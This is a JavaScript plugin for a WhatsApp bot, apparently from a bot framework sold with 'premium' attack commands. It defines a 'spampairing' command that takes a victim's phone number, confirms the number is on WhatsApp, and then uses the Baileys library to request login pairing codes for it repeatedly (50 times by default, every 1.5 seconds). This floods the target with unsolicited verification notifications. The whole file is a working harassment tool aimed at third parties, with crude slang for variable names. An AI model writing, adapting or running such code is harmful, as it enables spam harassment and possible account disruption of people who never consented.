let handler = async (m, {
	conn,
	prefix,
	text,
	args,
	command,
	config
}) => {

	if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|50`);
	let [peenis, pepekk = "50"] = text.split("|");
	let target = peenis.replace(/[^0-9]/g, '').trim();
	let cek = await conn.onWhatsApp(target + `@s.whatsapp.net`);
	if (cek.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`);
	await conn.sendAds(m.chat, {
		text: `   \`「 successfull 」\`\n\n- *Target:* ${target}\n- *Sender:* @${m.sender.split("@")[0]}`,
		title: `Powered by ${config.name}`
	})
	const {
		default: makeWaSocket,
		useMultiFileAuthState,
		fetchLatestBaileysVersion
	} = require('baileys');
	const {
		state
	} = await useMultiFileAuthState('pepek');
	const {
		version
	} = await fetchLatestBaileysVersion();
	const pino = require("pino");
	const sucked = await makeWaSocket({
		auth: state,
		version,
		logger: pino({
			level: 'fatal'
		})
	});
	const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
	for (let i = 0; i < pepekk; i++) {
		await sleep(1500);
		let prc = await sucked.requestPairingCode(target);
		console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
	}
	await sleep(15000);
}

handler.tags = ["bug"];
handler.help = ["62xx"];
handler.command = ["spampairing"];
handler.premium = true;
module.exports = handler;